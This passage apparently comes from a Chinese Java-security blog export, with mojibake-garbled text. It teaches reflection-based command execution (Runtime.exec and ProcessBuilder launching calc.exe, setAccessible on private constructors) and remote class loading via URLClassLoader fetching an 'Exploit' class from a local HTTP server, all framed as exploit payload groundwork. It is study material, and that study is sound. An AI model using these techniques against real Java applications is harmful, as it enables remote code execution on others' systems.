class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> è¿™é‡Œç”¨åˆ°äº† getMethod å’Œ invoke æ–¹æ³•ã€‚ getMethod çš„ä½œç”¨æ˜¯é€šè¿‡åå°„è·å–ä¸€ä¸ªç±»çš„æŸä¸ªç‰¹å®šçš„å…¬æœ‰æ–¹æ³•ã€‚è€Œå­¦è¿‡Javaçš„åŒå­¦åº”è¯¥æ¸…æ¥šï¼ŒJavaä¸­ æ”¯æŒç±»çš„é‡è½½ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…é€šè¿‡å‡½æ•°åæ¥ç¡®å®šä¸€ä¸ªå‡½æ•°ã€‚æ‰€ä»¥ï¼Œåœ¨è°ƒç”¨ getMethod çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ ä¼ ç»™ä»–ä½ éœ€è¦è·å–çš„å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ã€‚ æ¯”å¦‚è¿™é‡Œçš„ Runtime.exec æ–¹æ³•æœ‰6ä¸ªé‡è½½ï¼š</p><p>  <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713774614099-f12b5efa-a7f5-41ba-ba46-943882dfe2e2.png"></p><p> æˆ‘ä»¬ä½¿ç”¨æœ€ç®€å•çš„ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªï¼Œå®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œç±»å‹æ˜¯Stringï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ getMethod(â€œexecâ€, String.class) æ¥è·å– Runtime.exec æ–¹æ³•ã€‚ invoke çš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» è¿™ä¹Ÿæ¯”è¾ƒå¥½ç†è§£äº†ï¼Œæˆ‘ä»¬æ­£å¸¸æ‰§è¡Œæ–¹æ³•æ˜¯ [1].method([2], [3], [4]â€¦) ï¼Œå…¶å®åœ¨åå°„é‡Œå°±æ˜¯ method.invoke([1], [2], [3], [4]â€¦) ã€‚ æ‰€ä»¥æˆ‘ä»¬å°†ä¸Šè¿°å‘½ä»¤æ‰§è¡Œçš„Payloadåˆ†è§£ä¸€ä¸‹å°±æ˜¯ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="7-åå°„çš„è¿›é˜¶"><a href="#7-åå°„çš„è¿›é˜¶" class="headerlink" title="7.åå°„çš„è¿›é˜¶"></a>7.åå°„çš„è¿›é˜¶</h2><p> å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±» å‘¢ï¼Ÿ å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ  </p><p> ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸€ä¸ªæ–°çš„åå°„æ–¹æ³• getConstructor ã€‚ å’Œ getMethod ç±»ä¼¼ï¼Œ getConstructor æ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œ æ‰€ä»¥å¿…é¡»ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°ã€‚ è·å–åˆ°æ„é€ å‡½æ•°åï¼Œæˆ‘ä»¬ä½¿ç”¨ newInstance æ¥æ‰§è¡Œã€‚ æ¯”å¦‚ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„å¦ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ProcessBuilderï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨ start() æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure><p>   ProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š  </p><p> public ProcessBuilder(List command)</p><p> public ProcessBuilder(Stringâ€¦ command) </p><p>æˆ‘ä¸Šé¢ç”¨åˆ°äº†ç¬¬ä¸€ä¸ªå½¢å¼çš„æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘åœ¨ getConstructor çš„æ—¶å€™ä¼ å…¥çš„æ˜¯ List.class ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼Œå‰é¢è¿™ä¸ªPayloadç”¨åˆ°äº†Javaé‡Œçš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ—¶å€™ï¼ˆåœ¨è¡¨è¾¾å¼ä¸Šä¸‹æ–‡ä¸­ï¼‰æ˜¯æ²¡æœ‰è¿™ç§è¯­æ³•çš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä»éœ€åˆ©ç”¨åå°„æ¥å®Œæˆè¿™ä¸€æ­¥ã€‚  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(</span><br><span class="line">Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><p> é€šè¿‡ getMethod(â€œstartâ€) è·å–åˆ°startæ–¹æ³•ï¼Œç„¶å invoke æ‰§è¡Œï¼Œ invoke çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ ProcessBuilder Objectäº†ã€‚  <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713777446690-e7f354e3-35f7-48be-9dea-b4e3f79f69fc.png"> é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ public ProcessBuilder(Stringâ€¦ command) è¿™ä¸ªæ„é€ å‡½æ•°ï¼Œéœ€è¦æ€æ ·ç”¨å å°„æ‰§è¡Œå‘¢ï¼Ÿ è¿™åˆæ¶‰åŠåˆ°Javaé‡Œçš„å¯å˜é•¿å‚æ•°ï¼ˆvarargsï¼‰äº†ã€‚æ­£å¦‚å…¶ä»–è¯­è¨€ä¸€æ ·ï¼ŒJavaä¹Ÿæ”¯æŒå¯å˜é•¿å‚æ•°ï¼Œå°±æ˜¯å½“ä½  å®šä¹‰å‡½æ•°çš„æ—¶å€™ä¸ç¡®å®šå‚æ•°æ•°é‡çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ â€¦ è¿™æ ·çš„è¯­æ³•æ¥è¡¨ç¤ºâ€œè¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°æ˜¯å¯å˜ çš„â€ã€‚ å¯¹äºå¯å˜é•¿å‚æ•°ï¼ŒJavaå…¶å®åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚ä¸‹è¿™ä¸¤ç§å†™æ³•åœ¨åº•å±‚æ˜¯ç­‰ä»· çš„ï¼ˆä¹Ÿå°±ä¸èƒ½é‡è½½ï¼‰ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span> &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> ä¹Ÿç”±æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„ï¼Œæƒ³ä¼ ç»™helloå‡½æ•°ï¼Œåªéœ€ç›´æ¥ä¼ å³å¯ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">hello(names);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> é‚£ä¹ˆå¯¹äºåå°„æ¥è¯´ï¼Œå¦‚æœè¦è·å–çš„ç›®æ ‡å‡½æ•°é‡ŒåŒ…å«å¯å˜é•¿å‚æ•°ï¼Œå…¶å®æˆ‘ä»¬è®¤ä¸ºå®ƒæ˜¯æ•°ç»„å°±è¡Œäº†ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å°†å­—ç¬¦ä¸²æ•°ç»„çš„ç±» String[].class ä¼ ç»™ getConstructor ï¼Œè·å– ProcessBuilder çš„ç¬¬äºŒ ç§æ„é€ å‡½æ•°ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class)</span><br></pre></td></tr></table></figure><p> åœ¨è°ƒç”¨ newInstance çš„æ—¶å€™ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°æœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæˆ‘ä»¬ä¼ ç»™ ProcessBuilder çš„ä¹Ÿæ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥æ•´ä¸ªPayloadå¦‚ä¸‹ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> å†è¯´åˆ°ä»Šå¤©ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ  </p><p> è¿™å°±æ¶‰åŠåˆ° getDeclared ç³»åˆ—çš„åå°„äº†ï¼Œä¸æ™®é€šçš„ getMethod ã€ getConstructor åŒºåˆ«æ˜¯ï¼š </p><p>getMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³• </p><p>getDeclaredMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®åœ¨å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§ æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº†  </p><p> getDeclaredMethod çš„å…·ä½“ç”¨æ³•å’Œ getMethod ç±»ä¼¼ï¼Œ getDeclaredConstructor çš„å…·ä½“ç”¨æ³•å’Œ getConstructor ç±»ä¼¼ï¼Œæˆ‘å°±ä¸å†èµ˜è¿°ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå‰æ–‡æˆ‘ä»¬è¯´è¿‡Runtimeè¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ Runtime.getRuntime() æ¥ è·å–å¯¹è±¡ã€‚å…¶å®ç°åœ¨æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ getDeclaredConstructor æ¥è·å–è¿™ä¸ªç§æœ‰çš„æ„é€ æ–¹æ³•æ¥å®ä¾‹ åŒ–å¯¹è±¡ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼š  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> å¯è§ï¼Œè¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªæ–¹æ³• setAccessible ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„ã€‚æˆ‘ä»¬åœ¨è·å–åˆ°ä¸€ä¸ªç§æœ‰æ–¹æ³•åï¼Œå¿…é¡»ç”¨ setAccessible ä¿®æ”¹å®ƒçš„ä½œç”¨åŸŸï¼Œå¦åˆ™ä»ç„¶ä¸èƒ½è°ƒç”¨ã€‚  </p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaåŸºç¡€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç </title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•"><a href="#Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•" class="headerlink" title="Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•"></a>Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•</h2><h3 id="1ã€åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶"><a href="#1ã€åˆ©ç”¨-URLClassLoader-åŠ è½½è¿œç¨‹classæ–‡ä»¶" class="headerlink" title="1ã€åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶"></a>1ã€åˆ©ç”¨ URLClassLoader åŠ è½½è¿œç¨‹classæ–‡ä»¶</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨fileåè®®åœ¨æœ¬åœ°å¯»æ‰¾æŒ‡å®š.classæ–‡ä»¶</span></span><br><span class="line">        <span class="comment">//URL[] urls = new URL[]&#123;new URL(&quot;file:///Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/src/main/java/&quot;)&#125;;</span></span><br><span class="line">        <span class="comment">//ä½¿ç”¨httpåè®®åˆ°è¿œç¨‹åœ°å€å¯»æ‰¾æŒ‡å®š.classæ–‡ä»¶</span></span><br><span class="line">        URL[] urls = <span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2ã€åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#2ã€åˆ©ç”¨-ClassLoader-defineClass-ç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="2ã€åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç "></a>2ã€åˆ©ç”¨ ClassLoader#defineClass ç›´æ¥åŠ è½½å­—èŠ‚ç </h3><h4 id="2-1-åŒäº²å§”æ´¾æ¨¡å‹"><a href="#2-1-åŒäº²å§”æ´¾æ¨¡å‹" class="headerlink" title="2.1 åŒäº²å§”æ´¾æ¨¡å‹"></a>2.1 åŒäº²å§”æ´¾æ¨¡å‹</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714635178241-41ee8245-5f20-4328-a8fa-b0adc838691d.png"></p><p>BootstrapClassLoaderï¼šå¯åŠ¨ç±»åŠ è½½å™¨&#x2F;æ ¹åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM è¿è¡Œæ—¶æ ¸å¿ƒç±»ï¼Œè¿™äº›ç±»ä½äº JAVA_HOME&#x2F;lib&#x2F;rt.jar æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨å†…ç½®åº“ java.*.*éƒ½åœ¨é‡Œé¢ã€‚è¿™ä¸ª ClassLoader æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒå…¶å®ä¸æ˜¯ä¸€ä¸ªClassLoaderå®ä¾‹å¯¹è±¡ï¼Œè€Œæ˜¯ç”±Cä»£ç å®ç°ã€‚ç”¨æˆ·åœ¨å®ç°è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ—¶ï¼Œå¦‚æœéœ€è¦æŠŠåŠ è½½è¯·æ±‚å§”æ´¾ç»™å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œé‚£å¯ä»¥ç›´æ¥ä¼ å…¥nullä½œä¸º BootstrapClassLoaderã€‚</p><p>ExtClassLoaderï¼šæ‰©å±•ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½ JVM æ‰©å±•ç±»ï¼Œæ‰©å±• jar åŒ…ä½äº JAVA_HOME&#x2F;lib&#x2F;ext&#x2F;*.jar ä¸­ï¼Œåº“åé€šå¸¸ä»¥ javax å¼€å¤´ã€‚</p><p>AppClassLoaderï¼Œåº”ç”¨ç±»åŠ è½½å™¨&#x2F;ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œç›´æ¥æä¾›ç»™ç”¨æˆ·ä½¿ç”¨çš„ClassLoaderï¼Œå®ƒä¼šåŠ è½½ ClASSPATH ç¯å¢ƒå˜é‡æˆ–è€… java.class.path å±æ€§é‡Œå®šä¹‰çš„è·¯å¾„ä¸­çš„ jar åŒ…å’Œç›®å½•ï¼Œè´Ÿè´£åŠ è½½åŒ…æ‹¬å¼€å‘è€…ä»£ç ä¸­ã€ç¬¬ä¸‰æ–¹åº“ä¸­çš„ç±»ã€‚AppClassLoader å¯ä»¥ç”± ClassLoader ç±»æä¾›çš„é™æ€æ–¹æ³• getSystemClassLoader() å¾—åˆ°ã€‚</p><p>ClassLoader.getParent() å¯ä»¥è·å–ç”¨äºå§”æ´¾çš„çˆ¶çº§class loaderï¼Œé€šå¸¸ä¼šè¿”å›nullæ¥è¡¨ç¤ºbootstrap class loaderã€‚</p><h4 id="2-2-åŒäº²å§”æ´¾æ¨¡å‹çš„ä»£ç å®ç°"><a href="#2-2-åŒäº²å§”æ´¾æ¨¡å‹çš„ä»£ç å®ç°" class="headerlink" title="2.2 åŒäº²å§”æ´¾æ¨¡å‹çš„ä»£ç å®ç°"></a>2.2 <a href="https://so.csdn.net/so/search?q=%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B&spm=1001.2101.3001.7020">åŒäº²å§”æ´¾æ¨¡å‹</a>çš„ä»£ç å®ç°</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714635321800-c2187423-49fb-496d-9e33-36d083ce10ce.png">å¦‚ä¸Šå›¾ï¼Œå®ç°åŒäº²å§”æ´¾çš„ä»£ç éƒ½é›†ä¸­åœ¨ java.lang.ClassLoader#loadClass()æ–¹æ³•ä¸­ï¼Œå…¶é€»è¾‘å¦‚ä¸‹ï¼š</p><p>å…ˆæ£€æŸ¥æ˜¯å¦å·²è¢«åŠ è½½è¿‡;</p><p>è‹¥æ²¡æœ‰åŠ è½½è¿‡åˆ™è°ƒç”¨çˆ¶åŠ è½½å™¨çš„loadClass()æ–¹æ³•ï¼›</p><p>è‹¥çˆ¶åŠ è½½å™¨ä¸ºnullåˆ™é»˜è®¤ä½¿ç”¨å¯åŠ¨ç±»åŠ è½½å™¨(Bootstrap ClassLoader)ä½œä¸ºçˆ¶åŠ è½½å™¨ï¼›</p><p>å¦‚æœçˆ¶åŠ è½½å™¨åŠ è½½ç±»å¤±è´¥ï¼ŒæŠ›å‡ºClassNotFoundExceptionå¼‚å¸¸åï¼Œå†è°ƒç”¨è‡ªå·±çš„findClass()æ–¹æ³•è¿›è¡ŒåŠ è½½ã€‚(findClass()æœ€ç»ˆä¼šè°ƒç”¨defineClass()åŠ è½½å­—èŠ‚ç )</p><p>:::tips<br>æ³¨æ„ï¼š</p><p>è¿™é‡Œçš„â€œåŒäº²â€ï¼ŒæŒ‡çš„å¹¶ä¸æ˜¯æœ‰ä¸¤ä¸ªçˆ¶åŠ è½½å™¨ï¼Œå¯èƒ½ä»…ä»…æ˜¯è‹±æ–‡â€œparentâ€çš„ç¿»è¯‘ã€‚æ¯ä¸ªClassLoaderæœ€å¤šæœ‰ä¸€ä¸ªçˆ¶åŠ è½½å™¨ï¼Œä¹Ÿå°±æ˜¯parentå˜é‡ã€‚â€œåŒäº²å§”æ´¾æœºåˆ¶â€æŒ‡çš„å°±æ˜¯ä¼˜å…ˆè®©çˆ¶åŠ è½½å™¨å»åŠ è½½ç±»ï¼Œå¦‚æœçˆ¶åŠ è½½å™¨æ²¡æœ‰æˆåŠŸåŠ è½½åˆ°ç±»ï¼Œæ‰ç”±æœ¬ClassLoaderåŠ è½½ã€‚</p><p>è¿™æ ·å¯ä»¥ä¿è¯å®‰å…¨æ€§ï¼Œé˜²æ­¢ç³»ç»Ÿç±»è¢«ä¼ªé€ (æ¯”å¦‚è‡ªå®šä¹‰java.lang.Objectç±»ï¼Œè‚¯å®šæ˜¯æ— æ³•è¿è¡Œçš„)ã€‚</p><p>å¯¹äºJavaç¨‹åºæ¥è®²ï¼Œä¸€èˆ¬çš„ç±»æ˜¯ç”±AppClassLoaderæ¥åŠ è½½çš„ï¼Œè€Œç³»ç»Ÿç±»åˆ™æ˜¯ç”±BootStrapClassLoaderåŠ è½½çš„ã€‚ç”±äºBootStrapClassLoaderæ˜¯åœ¨nativeå±‚å®ç°çš„ï¼Œæ‰€ä»¥è°ƒç”¨ç³»ç»Ÿç±»çš„getClassLoader()æ–¹æ³•ä¼šè¿”å›nullã€‚</p><p>:::</p><h4 id="2-3-è‡ªå®šä¹‰ClassLoader"><a href="#2-3-è‡ªå®šä¹‰ClassLoader" class="headerlink" title="2.3 è‡ªå®šä¹‰ClassLoader"></a>2.3 è‡ªå®šä¹‰ClassLoader</h4><p>java.lang.ClassLoaderæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ã€‚åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ªClassLoaderçš„ç±»ï¼Œå¹¶é‡å†™findClass()æ–¹æ³•å®ç°ç±»çš„åŠ è½½ï¼Œå³å¯å®Œæˆè‡ªå®šä¹‰ClassLoaderã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String dirPath;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClassLoader&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(String 